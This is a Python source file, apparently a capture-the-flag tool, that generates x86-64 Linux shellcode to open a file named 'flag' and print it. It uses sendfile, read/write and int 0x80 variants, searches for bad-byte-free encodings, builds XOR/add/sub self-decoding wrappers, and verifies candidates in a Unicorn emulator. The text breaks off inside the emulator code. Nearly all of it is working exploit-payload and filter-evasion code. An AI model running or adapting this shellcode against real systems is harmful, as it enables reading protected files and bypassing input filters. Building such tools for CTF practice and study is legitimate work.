#!/usr/bin/env python3
"""Constraint-aware x86-64 Linux shellcode generator/verifier for SheBanG.

The module intentionally keeps the base templates as raw bytes.  Keystone/NASM
is therefore not required at match time.  Capstone and Unicorn are optional:
Capstone is used for pretty disassembly and Unicorn for deterministic syscall
emulation with poisoned initial registers.
"""

from __future__ import annotations

import argparse
import itertools
import json
import re
import sys
from functools import lru_cache
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Iterable, Sequence


def shellcode_cost(code: bytes) -> int:
    return sum(byte + 1 for byte in code)


def parse_hex(text: str) -> bytes:
    compact = re.sub(r"[^0-9a-fA-F]", "", text)
    if len(compact) % 2:
        raise ValueError("hex string has an odd number of nibbles")
    return bytes.fromhex(compact)


def parse_bad_bytes(values: Sequence[str]) -> frozenset[int]:
    out: set[int] = set()
    for value in values:
        for token in re.split(r"[\s,;:]+", value.strip()):
            if not token:
                continue
            token = token.lower().removeprefix("0x")
            if not re.fullmatch(r"[0-9a-f]{1,2}", token):
                raise ValueError(f"invalid byte: {token!r}")
            out.add(int(token, 16))
    return frozenset(out)


def bad_hits(code: bytes, bad: frozenset[int]) -> dict[str, list[int]]:
    return {
        f"{byte:02x}": [idx for idx, value in enumerate(code) if value == byte]
        for byte in sorted(bad)
        if byte in code
    }


@dataclass(frozen=True)
class Choice:
    name: str
    code: bytes
    note: str = ""


@dataclass(frozen=True)
class Candidate:
    name: str
    code: bytes
    strategy: str
    blocks: tuple[str, ...] = field(default_factory=tuple)
    assumptions: tuple[str, ...] = field(default_factory=tuple)

    @property
    def cost(self) -> int:
        return shellcode_cost(self.code)

    def record(self, bad: frozenset[int], disassemble: bool = False) -> dict:
        result = {
            "name": self.name,
            "strategy": self.strategy,
            "hex": self.code.hex(),
            "length": len(self.code),
            "cost": self.cost,
            "valid_forbidden": not bool(bad_hits(self.code, bad)),
            "bad_hits": bad_hits(self.code, bad),
            "blocks": list(self.blocks),
            "assumptions": list(self.assumptions),
        }
        if disassemble:
            result["disassembly"] = disassemble_x64(self.code)
        return result


def _choice(name: str, hex_bytes: str, note: str = "") -> Choice:
    return Choice(name, bytes.fromhex(hex_bytes), note)


def _beam_append(
    states: list[tuple[bytes, tuple[str, ...]]],
    choices: Iterable[Choice],
    bad: frozenset[int],
    width: int,
) -> list[tuple[bytes, tuple[str, ...]]]:
    expanded: dict[bytes, tuple[str, ...]] = {}
    for code, names in states:
        for item in choices:
            if any(byte in bad for byte in item.code):
                continue
            merged = code + item.code
            expanded.setdefault(merged, names + (item.name,))
    return sorted(
        ((code, names) for code, names in expanded.items()),
        key=lambda pair: (shellcode_cost(pair[0]), len(pair[0]), pair[0]),
    )[:width]


def _xor_pairs(target: bytes, bad: frozenset[int], high_positive: bool) -> list[tuple[bytes, bytes]]:
    """Return low-cost A/B pairs satisfying A xor B == target."""
    states: list[tuple[bytes, bytes]] = [(b"", b"")]
    for index, wanted in enumerate(target):
        pairs: list[tuple[int, int]] = []
        for left in range(256):
            right = left ^ wanted
            if left in bad or right in bad:
                continue
            if high_positive and index == len(target) - 1 and left >= 0x80:
                continue
            pairs.append((left, right))
        pairs.sort(key=lambda pair: (pair[0] + pair[1], pair[0], pair[1]))
        next_states: list[tuple[bytes, bytes]] = []
        for prefix_a, prefix_b in states:
            for left, right in pairs[:24]:
                next_states.append((prefix_a + bytes([left]), prefix_b + bytes([right])))
        next_states.sort(key=lambda pair: (shellcode_cost(pair[0] + pair[1]), pair))
        states = next_states[:256]
    return states


@lru_cache(maxsize=128)
def path_choices(path: bytes, bad: frozenset[int], limit: int = 128) -> tuple[Choice, ...]:
    if not (1 <= len(path) <= 4):
        raise ValueError("current compact path templates require a 1..4 byte filename")
    target = path.ljust(4, b"\0")
    choices: list[Choice] = []

    # push imm32 sign-extends to 64 bits.  For 'flag', the upper dword is zero,
    # providing the terminating NUL for free.
    if target[3] < 0x80:
        choices.append(Choice("path:push-imm32", b"\x68" + target))
    choices.extend(
        [
            Choice("path:mov-ebx/push-rbx", b"\xbb" + target + b"\x53"),
            Choice("path:mov-esi/push-rsi", b"\xbe" + target + b"\x56"),
            Choice("path:push0/mov-[rsp]", b"\x6a\x00\xc7\x04\x24" + target),
        ]
    )

    xor_pairs = _xor_pairs(target, bad, high_positive=True)
    for idx, (left, right) in enumerate(xor_pairs[:64]):
        choices.append(
            Choice(
                f"path:push-xor-mem:{idx}",
                b"\x68" + left + b"\x81\x34\x24" + right,
                "push A; xor dword [rsp], B",
            )
        )

    register_xor_forms = [
        ("ebx", b"\xbb", b"\x81\xf3", b"\x53"),
        ("esi", b"\xbe", b"\x81\xf6", b"\x56"),
        ("edi", b"\xbf", b"\x81\xf7", b"\x57"),
    ]
    for reg, mov, xor, push in register_xor_forms:
        for idx, (left, right) in enumerate(_xor_pairs(target, bad, high_positive=False)[:24]):
            choices.append(
                Choice(f"path:{reg}-xor:{idx}", mov + left + xor + right + push)
            )

    valid = [item for item in choices if not any(byte in bad for byte in item.code)]
    unique: dict[bytes, Choice] = {}
    for item in valid:
        unique.setdefault(item.code, item)
    return tuple(sorted(unique.values(), key=lambda item: (shellcode_cost(item.code), len(item.code), item.code))[:limit])


PTR_RDI = [
    _choice("ptr:push-rsp/pop-rdi", "545f"),
    _choice("ptr:mov-rdi-rsp", "4889e7"),
    _choice("ptr:lea-rdi-rsp", "488d3c24"),
]
CLEAR_ESI = [
    _choice("esi:xor", "31f6"),
    _choice("esi:sub", "29f6"),
    _choice("esi:push0/pop", "6a005e"),
]
SET_RAX_2 = [
    _choice("rax2:push/pop", "6a0258"),
    _choice("rax2:xor/mov-al", "31c0b002"),
    _choice("rax2:sub/mov-al", "29c0b002"),
    _choice("rax2:xor/add-al", "31c00402"),
    _choice("rax2:push3/pop/dec", "6a0358ffc8"),
    _choice("rax2:push4/pop/sub2", "6a045883e802"),
]
ZERO_RDX_AFTER_RAX2 = [
    _choice("rdx0:cdq", "99", "valid because eax=2"),
    _choice("rdx0:xor", "31d2"),
    _choice("rdx0:sub", "29d2"),
    _choice("rdx0:push0/pop", "6a005a"),
]
SYSCALL = [_choice("syscall", "0f05")]
FD_TO_ESI = [
    _choice("fd:xchg-eax-esi", "96", "also makes eax=0 because esi was cleared"),
    _choice("fd:push-rax/pop-rsi", "505e"),
]
FD_TO_EDI = [
    _choice("fd:xchg-eax-edi", "97"),
    _choice("fd:push-rax/pop-rdi", "505f"),
]
SET_STDOUT = [
    _choice("stdout:push1/pop-rdi", "6a015f"),
    _choice("stdout:xor/inc", "31ffffc7"),
    _choice("stdout:sub/add", "29ff83c701"),
]
SET_RAX_40 = [
    _choice("rax40:push/pop", "6a2858"),
    _choice("rax40:xor/mov-al", "31c0b028"),
    _choice("rax40:sub/mov-al", "29c0b028"),
    _choice("rax40:xor/add-al", "31c00428"),
]
BUF_RSI = [
    _choice("buf:push-rsp/pop-rsi", "545e"),
    _choice("buf:mov-rsi-rsp", "4889e6"),
    _choice("buf:lea-rsi-rsp", "488d3424"),
]
CLEAR_EAX = [
    _choice("eax0:xor", "31c0"),
    _choice("eax0:sub", "29c0"),
    _choice("eax0:push0/pop", "6a0058"),
]
LEN_TO_EDX = [
    _choice("len:xchg-eax-edx", "92"),
    _choice("len:push-rax/pop-rdx", "505a"),
]
SET_WRITE_FDS = [
    _choice("write:push1-pop-rax/push-rax-pop-rdi", "6a0158505f"),
    _choice("write:push1-pop-rax/push1-pop-rdi", "6a01586a015f"),
    _choice("write:xor-inc-rax/push-rax-pop-rdi", "31c0ffc0505f"),
    _choice("write:sub-add-rax/sub-add-rdi", "29c083c00129ff83c701"),
]
INT80 = [_choice("int80", "cd80")]


def compat_path_store_choices(path: bytes, bad: frozenset[int], limit: int = 64) -> list[Choice]:
    if not (1 <= len(path) <= 4):
        raise ValueError("compat path store supports a 1..4 byte filename")
    target = path.ljust(4, b"\0")
    choices = [
        Choice("path-store:imm-[rbx]", b"\xc7\x03" + target),
        Choice("path-store:eax", b"\xb8" + target + b"\x89\x03"),
        Choice("path-store:edx", b"\xba" + target + b"\x89\x13"),
    ]
    for idx, (left, right) in enumerate(_xor_pairs(target, bad, high_positive=False)[:64]):
        choices.append(Choice(f"path-store:eax-xor:{idx}", b"\xb8" + left + b"\x35" + right + b"\x89\x03"))
        choices.append(Choice(f"path-store:edx-xor:{idx}", b"\xba" + left + b"\x81\xf2" + right + b"\x89\x13"))
    valid = [item for item in choices if not any(byte in bad for byte in item.code)]
    unique: dict[bytes, Choice] = {}
    for item in valid:
        unique.setdefault(item.code, item)
    return sorted(unique.values(), key=lambda item: (shellcode_cost(item.code), len(item.code), item.code))[:limit]


def _generate_with_blocks(
    prefix_choices: list[Choice],
    blocks: list[list[Choice]],
    bad: frozenset[int],
    width: int,
) -> list[tuple[bytes, tuple[str, ...]]]:
    states = [(item.code, (item.name,)) for item in prefix_choices if not any(b in bad for b in item.code)]
    states.sort(key=lambda pair: (shellcode_cost(pair[0]), len(pair[0]), pair[0]))
    states = states[:width]
    for block in blocks:
        states = _beam_append(states, block, bad, width)
        if not states:
            break
    return states


def generate_sendfile(
    path: bytes,
    bad: frozenset[int],
    max_flag: int,
    width: int,
) -> list[Candidate]:
    if max_flag > 127:
        raise ValueError("compact sendfile templates support max_flag <= 127")
    counts = sorted(set([max_flag, max(max_flag, 64), max(max_flag, 96), 127]))
    set_count = [
        Choice(f"count:push-{count}/pop-r10", bytes([0x6A, count, 0x41, 0x5A]))
        for count in counts
        if 1 <= count <= 127
    ]
    blocks = [
        PTR_RDI,
        CLEAR_ESI,
        SET_RAX_2,
        ZERO_RDX_AFTER_RAX2,
        SYSCALL,
        FD_TO_ESI,
        SET_STDOUT,
        set_count,
        SET_RAX_40,
        SYSCALL,
    ]
    states = _generate_with_blocks(list(path_choices(path, bad)), blocks, bad, width)
    return [
        Candidate(
            f"sendfile-{idx:04d}",
            code,
            "open(2) + sendfile(40)",
            names,
            (f"flag length <= selected sendfile count (configured max {max_flag})", "Linux x86-64 syscall ABI"),
        )
        for idx, (code, names) in enumerate(states)
    ]


def generate_readwrite(
    path: bytes,
    bad: frozenset[int],
    max_flag: int,
    width: int,
) -> list[Candidate]:
    if max_flag > 127:
        raise ValueError("compact read templates support max_flag <= 127")
    counts = sorted(set([max_flag, max(max_flag, 64), max(max_flag, 96), 127]))
    set_count = [Choice(f"read-count:mov-dl-{count}", bytes([0xB2, count])) for count in counts]
    blocks = [
        PTR_RDI,
        CLEAR_ESI,
        SET_RAX_2,
        ZERO_RDX_AFTER_RAX2,
        SYSCALL,
        FD_TO_EDI,
        BUF_RSI,
        set_count,
        CLEAR_EAX,
        SYSCALL,
        LEN_TO_EDX,
        SET_WRITE_FDS,
        SYSCALL,
    ]
    states = _generate_with_blocks(list(path_choices(path, bad)), blocks, bad, width)
    return [
        Candidate(
            f"readwrite-{idx:04d}",
            code,
            "open(2) + read(0) + write(1)",
            names,
            (f"flag length <= selected read count (configured max {max_flag})", "Linux x86-64 syscall ABI"),
        )
        for idx, (code, names) in enumerate(states)
    ]


def generate_int80(
    path: bytes,
    bad: frozenset[int],
    max_flag: int,
    width: int,
) -> list[Candidate]:
    """Generate an IA32-compat fallback that first maps a low fixed page.

    A 64-bit process can enter the kernel through int 0x80 when IA32 emulation
    is enabled.  mmap2 creates a buffer below 4 GiB so all pointer arguments
    survive the compat ABI's 32-bit truncation.
    """
    if max_flag > 127:
        raise ValueError("compact int80 templates support max_flag <= 127")
    counts = sorted(set([max_flag, max(max_flag, 64), max(max_flag, 96), 127]))
    set_count = [Choice(f"compat-count:{count}", bytes([0x6A, count, 0x5A])) for count in counts]
    blocks = [
        [
            _choice("mmap2:eax192-xor/mov", "31c0b0c0"),
            _choice("mmap2:eax192-sub/mov", "29c0b0c0"),
        ],
        [
            _choice("mmap2:ebx-0x10000", "6a015bc1e310"),
            _choice("mmap2:ebx-0x10000-alt", "31dbffc3c1e310"),
        ],
        [
            _choice("mmap2:ecx-0x1000", "6a0159c1e10c"),
            _choice("mmap2:ecx-0x1000-alt", "31c9ffc1c1e10c"),
        ],
        [
            _choice("mmap2:edx-prot7", "6a075a"),
            _choice("mmap2:edx-prot7-alt", "31d2b207"),
        ],
        [
            _choice("mmap2:esi-flags32", "6a325e"),
            _choice("mmap2:esi-flags32-alt", "31f6b632"),
        ],
        [
            _choice("mmap2:edi-minus1", "6aff5f"),
            _choice("mmap2:edi-minus1-xor/dec", "31ffffcf"),
            _choice("mmap2:edi-minus1-sub/dec", "29ffffcf"),
            _choice("mmap2:edi-minus1-push/neg", "6a015ff7df"),
        ],
        [
            _choice("mmap2:ebp0-xor", "31ed"),
            _choice("mmap2:ebp0-sub", "29ed"),
            _choice("mmap2:ebp0-push/pop", "6a005d"),
        ],
        INT80,
        [
            _choice("ptr:eax-to-edi-ebx", "89c789c3"),
            _choice("ptr:eax-push-to-edi-ebx", "505f505b"),
        ],
        compat_path_store_choices(path, bad),
        [
            _choice("open:ecx0-xor", "31c9"),
            _choice("open:ecx0-sub", "29c9"),
            _choice("open:ecx0-push/pop", "6a0059"),
        ],
        [
            _choice("open:edx0-xor", "31d2"),
            _choice("open:edx0-sub", "29d2"),
            _choice("open:edx0-push/pop", "6a005a"),
        ],
        [
            _choice("open:eax5", "6a0558"),
            _choice("open:eax5-xor/mov", "31c0b005"),
            _choice("open:eax5-sub/mov", "29c0b005"),
        ],
        INT80,
        [_choice("open-fd:xchg-eax-ebx", "93"), _choice("open-fd:push/pop-ebx", "505b")],
        [_choice("read-buf:mov-ecx-edi", "89f9"), _choice("read-buf:push-rdi/pop-rcx", "5759")],
        set_count,
        [
            _choice("read:eax3", "6a0358"),
            _choice("read:eax3-xor/mov", "31c0b003"),
            _choice("read:eax3-sub/mov", "29c0b003"),
        ],
        INT80,
        [_choice("write-len:xchg-eax-edx", "92"), _choice("write-len:push/pop-edx", "505a")],
        [
            _choice("write:ebx1", "6a015b"),
            _choice("write:ebx1-xor/inc", "31dbffcb"),
            _choice("write:ebx1-sub/inc", "29dbffcb"),
        ],
        [_choice("write-buf:mov-ecx-edi", "89f9"), _choice("write-buf:push-rdi/pop-rcx", "5759")],
        [
            _choice("write:eax4", "6a0458"),
            _choice("write:eax4-xor/mov", "31c0b004"),
            _choice("write:eax4-sub/mov", "29c0b004"),
        ],
        INT80,
    ]
    # There is no independent path prefix for this strategy, so begin with an
    # empty choice and let the normal cost-pruned beam compose all blocks.
    states = _generate_with_blocks([Choice("compat:start", b"")], blocks, bad, width)
    return [
        Candidate(
            f"int80-{idx:04d}",
            code,
            "IA32 mmap2 + open/read/write via int 0x80",
            names,
            (
                "Linux kernel IA32 emulation enabled",
                "MAP_FIXED at 0x10000 succeeds",
                f"flag length <= selected read count (configured max {max_flag})",
            ),
        )
        for idx, (code, names) in enumerate(states)
    ]


@lru_cache(maxsize=512)
def _count_setters(length: int, bad: frozenset[int]) -> tuple[tuple[str, bytes], ...]:
    choices: list[tuple[str, bytes]] = [
        ("push/pop", bytes([0x6A, length, 0x59])),
        ("xor/mov-cl", bytes([0x31, 0xC9, 0xB1, length])),
        ("sub/mov-cl", bytes([0x29, 0xC9, 0xB1, length])),
    ]
    for left in range(256):
        right = left ^ length
        choices.append((f"push/xor-cl:{left:02x}^{right:02x}", bytes([0x6A, left, 0x59, 0x80, 0xF1, right])))
        choices.append((f"xor/mov/xor-cl:{left:02x}^{right:02x}", bytes([0x31, 0xC9, 0xB1, left, 0x80, 0xF1, right])))
    valid = [item for item in choices if not any(byte in bad for byte in item[1])]
    unique = {code: name for name, code in valid}
    return tuple(sorted(((name, code) for code, name in unique.items()), key=lambda item: (shellcode_cost(item[1]), len(item[1]), item[1]))[:12])


@lru_cache(maxsize=2048)
def _decoder_bodies(length: int, key: int, bad: frozenset[int]) -> tuple[tuple[str, bytes, str], ...]:
    """Return (name, decoder, transform) variants for one key.

    transform describes how the payload must be encoded: xor, add means the
    decoder adds key, and sub means the decoder subtracts key.
    """
    save_finish = [
        ("stack/ret", b"\x56", b"\xc3"),
        ("stack/pop-rdi-jmp", b"\x56", b"\x5f\xff\xe7"),
        ("stack/pop-rax-jmp", b"\x56", b"\x58\xff\xe0"),
        ("rdi/jmp", b"\x48\x89\xf7", b"\xff\xe7"),
        ("rbx/jmp", b"\x48\x89\xf3", b"\xff\xe3"),
        ("rdi/push-ret", b"\x48\x89\xf7", b"\x57\xc3"),
    ]
    mutations = [
        ("xor", bytes([0x80, 0x36, key])),
        ("add", bytes([0x80, 0x06, key])),
        ("sub", bytes([0x80, 0x2E, key])),
    ]
    increments = [
        ("inc", b"\x48\xff\xc6"),
        ("add1", b"\x48\x83\xc6\x01"),
        ("lea1", b"\x48\x8d\x76\x01"),
        # SysV requires DF clear across function calls, so LODSB is a useful
        # single-byte increment fallback.  AL is dead in the decoder.
        ("lodsb", b"\xac"),
    ]
    results: list[tuple[str, bytes, str]] = []
    for (save_name, save, finish), (count_name, set_count), (transform, mutate), (inc_name, increment) in itertools.product(
        save_finish, _count_setters(length, bad), mutations, increments
    ):
        prefix = b"\x5e" + save + set_count
        loop_start = len(prefix)
        core = mutate + increment

        loop_forms: list[tuple[str, bytes]] = []
        # loop rel8: displacement is measured from after the two-byte branch.
        delta_loop = loop_start - (len(prefix) + len(core) + 2)
        if -128 <= delta_loop <= 127:
            loop_forms.append(("loop", bytes([0xE2, delta_loop & 0xFF])))
        delta_dec = loop_start - (len(prefix) + len(core) + 2 + 2)
        if -128 <= delta_dec <= 127:
            loop_forms.append(("dec/jnz", b"\xff\xc9\x75" + bytes([delta_dec & 0xFF])))
        delta_sub = loop_start - (len(prefix) + len(core) + 3 + 2)
        if -128 <= delta_sub <= 127:
            loop_forms.append(("sub/jnz", b"\x83\xe9\x01\x75" + bytes([delta_sub & 0xFF])))

        for loop_name, loop in loop_forms:
            body = prefix + core + loop + finish
            if any(byte in bad for byte in body):
                continue
            name = f"{save_name}/{count_name}/{transform}/{inc_name}/{loop_name}"
            results.append((name, body, transform))

    unique: dict[tuple[bytes, str], str] = {}
    for name, body, transform in results:
        unique.setdefault((body, transform), name)
    return tuple(sorted(
        ((name, body, transform) for (body, transform), name in unique.items()),
        key=lambda item: (shellcode_cost(item[1]), len(item[1]), item[1], item[2]),
    )[:96])


def xor_wrap(candidate: Candidate, bad: frozenset[int], limit: int = 64) -> list[Candidate]:
    """XOR-encode a payload with two compact call/pop decoder layouts.

    The backward-call layout avoids 00 but contains ff in its rel32.  The
    forward-call layout avoids ff but usually contains 00 in its positive
    rel32.  Together they are useful fallbacks when syscall/path bytes become
    forbidden.
    """
    length = len(candidate.code)
    if not 1 <= length <= 127:
        return []
    results: list[Candidate] = []
    safe_fillers = [byte for byte in range(256) if byte not in bad]
    if not safe_fillers:
        return []
    filler = min(safe_fillers)

    for key in range(1, 256):
        for decoder_name, body, transform in _decoder_bodies(length, key, bad):
            if transform == "xor":
                encoded = bytes(byte ^ key for byte in candidate.code)
            elif transform == "add":
                encoded = bytes((byte - key) & 0xFF for byte in candidate.code)
            else:  # decoder subtracts key
                encoded = bytes((byte + key) & 0xFF for byte in candidate.code)
            if any(byte in bad for byte in encoded):
                continue

            # Vary unreachable padding so short/near branch displacement bytes
            # can evade newly forbidden values without changing the payload.
            for pad_len in range(0, 33):
                padding = bytes([filler]) * pad_len

                # call-forward: call jumps over encoded payload + padding to
                # the decoder.  The pushed return address is payload start.
                displacement = length + pad_len
                forward = b"\xe8" + displacement.to_bytes(4, "little") + encoded + padding + body
                if not any(byte in bad for byte in forward):
                    results.append(
                        Candidate(
                            f"wrap-forward-k{key:02x}-{candidate.name}",
                            forward,
                            f"encoded wrapper around {candidate.strategy}",
                            (f"codec:{transform}:{key:02x}", f"decoder:call-forward:{decoder_name}") + candidate.blocks,
                            candidate.assumptions,
                        )
                    )

                # jmp/call/pop with a negative rel32.  Padding is unreachable
                # between decoder and call and adjusts both displacement bytes.
                jump_distance = len(body) + pad_len
                if jump_distance <= 127:
                    jump = bytes([0xEB, jump_distance])
                    call_start = len(jump) + len(body) + pad_len
                    call_next = call_start + 5
                    rel = len(jump) - call_next
                    backward = jump + body + padding + b"\xe8" + (rel & 0xFFFFFFFF).to_bytes(4, "little") + encoded
                    if not any(byte in bad for byte in backward):
                        results.append(
                            Candidate(
                                f"wrap-backward-k{key:02x}-{candidate.name}",
                                backward,
                                f"encoded wrapper around {candidate.strategy}",
                                (f"codec:{transform}:{key:02x}", f"decoder:jmp-call-pop:{decoder_name}") + candidate.blocks,
                                candidate.assumptions,
                            )
                        )

                # Enough variants for this body; later sorting chooses by cost.
                if len(results) >= 256:
                    break
            if len(results) >= 256:
                break
        if len(results) >= 256:
            break

    unique: dict[bytes, Candidate] = {}
    for item in results:
        unique.setdefault(item.code, item)
    return sorted(unique.values(), key=lambda item: (item.cost, len(item.code), item.code))[:limit]


def generate_candidates(
    path: bytes = b"flag",
    bad: frozenset[int] = frozenset(),
    max_flag: int = 127,
    width: int = 512,
    wrappers: bool = True,
) -> list[Candidate]:
    direct = generate_sendfile(path, bad, max_flag, width)
    direct.extend(generate_readwrite(path, bad, max_flag, width))
    if 0x0F in bad or 0x05 in bad or not direct:
        direct.extend(generate_int80(path, bad, max_flag, width))
    candidates = list(direct)
    needs_wrappers = wrappers and (not direct or 0x0F in bad or 0x05 in bad)
    if needs_wrappers:
        # Generate cheap unconstrained payloads, then encode every forbidden
        # byte (including path literals and syscall opcodes) behind a safe stub.
        bases = generate_sendfile(path, frozenset(), max_flag, min(width, 64))[:3]
        bases += generate_readwrite(path, frozenset(), max_flag, min(width, 64))[:1]
        for base in bases:
            candidates.extend(xor_wrap(base, bad, limit=16))
    unique: dict[bytes, Candidate] = {}
    for item in candidates:
        if not bad_hits(item.code, bad):
            unique.setdefault(item.code, item)
    return sorted(unique.values(), key=lambda item: (item.cost, len(item.code), item.code))


def disassemble_x64(code: bytes) -> list[str]:
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
    except ImportError:
        return ["capstone not installed"]
    engine = Cs(CS_ARCH_X86, CS_MODE_64)
    return [
        f"{ins.address:04x}: {ins.bytes.hex():<20} {ins.mnemonic} {ins.op_str}".rstrip()
        for ins in engine.disasm(code, 0)
    ]


@dataclass
class EmulationResult:
    ok: bool
    output_hex: str
    output_text: str
    syscalls: list[dict]
    instructions: int
    error: str | None = None


def emulate(code: bytes, flag_data: bytes, expected_path: bytes = b"flag") -> EmulationResult:
    try:
        from unicorn import UC_ARCH_X86, UC_HOOK_CODE, UC_HOOK_INTR, UC_MODE_64, Uc, UcError
        from unicorn.x86_const import (
            UC_X86_REG_R10,
            UC_X86_REG_R11,
            UC_X86_REG_R12,
            UC_X86_REG_R13,
            UC_X86_REG_R14,
            UC_X86_REG_R15,
            UC_X86_REG_R8,
            UC_X86_REG_R9,
            UC_X86_REG_RAX,
            UC_X86_REG_RBP,
            UC_X86_REG_RBX,
            UC_X86_REG_RCX,
            UC_X86_REG_RDI,
            UC_X86_REG_RDX,
            UC_X86_REG_RIP,
            UC_X86_REG_RSI,
            UC_X86_REG_RSP,
        )
    except ImportError as exc:
        return EmulationResult(False, "", "", [], 0, f"unicorn unavailable: {exc}")

    code_base = 0x100000
    code_size = 0x20000
    stack_base = 0x200000
    stack_size = 0x20000
    compat_base = 0x10000
    compat_size = 0x10000
    poison = 0xA5A5A5A5A5A5A5A5
    output = bytearray()
    syscalls: list[dict] = []
    state = {"instructions": 0, "error": None, "opened": False, "ok": False}
    uc = Uc(UC_ARCH_X86, UC_MODE_64)
    uc.mem_map(compat_base, compat_size)
    uc.mem_map(code_base, code_size)
    uc.mem_map(stack_base, stack_size)
    uc.mem_write(code_base, code)
    registers = [
        UC_X86_REG_RAX, UC_X86_REG_RBX, UC_X86_REG_RCX, UC_X86_REG_RDX,
        UC_X86_REG_RSI, UC_X86_REG_RDI, UC_X86_REG_RBP, UC_X86_REG_R8,
        UC_X86_REG_R9, UC_X86_REG_R10, UC_X86_REG_R11, UC_X86_REG_R12,
        UC_X86_REG_R13, UC_X86_REG_R14, UC_X86_REG_R15,
    ]
    for register in registers:
        uc.reg_write(register, poison)
    uc.reg_write(UC_X86_REG_RSP, stack_base + stack_size - 0x100)
    uc.reg_write(UC_X86_REG_RIP, code_base)

    def reg(register: int) -> int:
        return int(uc.reg_read(register)) & 0xFFFFFFFFFFFFFFFF

    def read_c_string(address: int, maximum: int = 256) -> bytes:
        result = bytearray()
        for offset in range(maximum):
            value = bytes(uc.mem_read(address + offset, 1))[0]
            if value == 0:
                return bytes(result)
            result.append(value)
        raise ValueError("unterminated pathname")

    def fail(message: str) -> None:
        state["error"] = message
        uc.emu_stop()

    def hook_code(_uc: Uc, address: int, size: int, _user_data: object) -> None:
        state["instructions"] += 1
        if state["instructions"] > 20_000:
            fail("instruction limit exceeded")
            return
        if not code_base <= address < code_base + len(code):
            fail(f"execution escaped shellcode at 0x{address:x}")
            return
        instruction = bytes(uc.mem_read(address, size))
        if instruction != b"\x0f\x05":
            return

        number = reg(UC_X86_REG_RAX)
        args = {
            "rax": number,
            "rdi": reg(UC_X86_REG_RDI),
            "rsi": reg(UC_X86_REG_RSI),
            "rdx": reg(UC_X86_REG_RDX),
            "r10": reg(UC_X86_REG_R10),
        }
        entry: dict = {"number": number, "args": args}
        try:
            if number == 2:  # open(path, flags, mode)
                path = read_c_string(args["rdi"])
                entry["name"] = "open"
                entry["path"] = path.decode("utf-8", errors="backslashreplace")
                if path != expected_path or args["rsi"] != 0:
                    uc.reg_write(UC_X86_REG_RAX, 0xFFFFFFFFFFFFFFFE)
                    entry["return"] = -2
                else:
                    state["opened"] = True
                    uc.reg_write(UC_X86_REG_RAX, 3)
                    entry["return"] = 3
            elif number == 257:  # openat(dirfd, path, flags, mode)
                path = read_c_string(args["rsi"])
                entry["name"] = "openat"
                entry["path"] = path.decode("utf-8", errors="backslashreplace")
                if path != expected_path or args["rdx"] != 0:
                    uc.reg_write(UC_X86_REG_RAX, 0xFFFFFFFFFFFFFFFE)
                    entry["return"] = -2
                else:
                    state["opened"] = True
                    uc.reg_write(UC_X86_REG_RAX, 3)
                    entry["return"] = 3
            elif number == 0:  # read(fd, buf, count)
                entry["name"] = "read"
                if not state["opened"] or args["rdi"] != 3:
                    fail("read used an unopened/non-flag fd")
                    return
                data = flag_data[: args["rdx"]]
                uc.mem_write(args["rsi"], data)
                uc.reg_write(UC_X86_REG_RAX, len(data))
                entry["return"] = len(data)
            elif number == 1:  # write(fd, buf, count)
                entry["name"] = "write"
                if args["rdi"] != 1:
                    fail(f"write fd is {args['rdi']}, not stdout")
                    return
                data = bytes(uc.mem_read(args["rsi"], args["rdx"]))
                output.extend(data)
                uc.reg_write(UC_X86_REG_RAX, len(data))
                entry["return"] = len(data)
            elif number == 40:  # sendfile(out_fd, in_fd, offset, count)
                entry["name"] = "sendfile"
                if not state["opened"] or args["rdi"] != 1 or args["rsi"] != 3 or args["rdx"] != 0:
                    fail("invalid sendfile descriptors/offset")
                    return
                data = flag_data[: args["r10"]]
                output.extend(data)
                uc.reg_write(UC_X86_REG_RAX, len(data))
                entry["return"] = len(data)
            elif number in (60, 231):
                entry["name"] = "exit"
                entry["return"] = 0
                uc.emu_stop()
            else:
                entry["name"] = "unknown"
                fail(f"unsupported/incorrect syscall {number}")
                return
        except Exception as exc:  # emulator diagnostics should be explicit
            fail(f"syscall emulation failed: {exc}")
            return
        finally:
            syscalls.append(entry)

        if bytes(output) == flag_data:
            state["ok"] = True
            uc.emu_stop()
        elif len(output) >= len(flag_data):
            fail("stdout does not exactly match the flag data")

    def hook_interrupt(_uc: Uc, interrupt: int, _user_data: object) -> None:
        if interrupt != 0x80:
            fail(f"unexpected interrupt 0x{interrupt:x}")
            return
        number = reg(UC_X86_REG_RAX) & 0xFFFFFFFF
        args = {
            "eax": number,
            "ebx": reg(UC_X86_REG_RBX) & 0xFFFFFFFF,
            "ecx": reg(UC_X86_REG_RCX) & 0xFFFFFFFF,
            "edx": reg(UC_X86_REG_RDX) & 0xFFFFFFFF,
            "esi": reg(UC_X86_REG_RSI) & 0xFFFFFFFF,
            "edi": reg(UC_X86_REG_RDI) & 0xFFFFFFFF,
            "ebp": reg(UC_X86_REG_RBP) & 0xFFFFFFFF,
        }
        entry: dict = {"number": number, "abi": "int80", "args": args}
        try:
            if number == 192:  # i386 mmap2
                entry["name"] = "mmap2"
                valid = (
                    args["ebx"] == compat_base
                    and args["ecx"] <= compat_size
                    and (args["edx"] & 0x3) == 0x3
                    and (args["esi"] & 0x32) == 0x32
                )
                if not valid:
                    fail("invalid compat mmap2 arguments")
                    return
                uc.reg_write(UC_X86_REG_RAX, compat_base)
                entry["return"] = compat_base
            elif number == 5:  # i386 open
                entry["name"] = "open"
                path = read_c_string(args["ebx"])
                entry["path"] = path.decode("utf-8", errors="backslashreplace")
                if path != expected_path or args["ecx"] != 0:
                    uc.reg_write(UC_X86_REG_RAX, 0xFFFFFFFE)
                    entry["return"] = -2
                else:
                    state["opened"] = True
                    uc.reg_write(UC_X86_REG_RAX, 3)
                    entry["return"] = 3
            elif number == 3:  # i386 read
                entry["name"] = "read"
                if not state["opened"] or args["ebx"] != 3:
                    fail("compat read used an unopened/non-flag fd")
                    return
                data = flag_data[: args["edx"]]
                uc.mem_write(args["ecx"], data)
                uc.reg_write(UC_X86_REG_RAX, len(data))
                entry["return"] = len(data)
            elif number == 4:  # i386 write
                entry["name"] = "write"
                if args["ebx"] != 1:
                    fail(f"compat write fd is {args['ebx']}, not stdout")
                    return
                data = bytes(uc.mem_read(args["ecx"], args["edx"]))
                output.extend(data)
                uc.reg_write(UC_X86_REG_RAX, len(data))
                entry["return"] = len(data)
            elif number in (1, 252):
                entry["name"] = "exit"
                entry["return"] = 0
                uc.emu_stop()
            else:
                entry["name"] = "unknown"
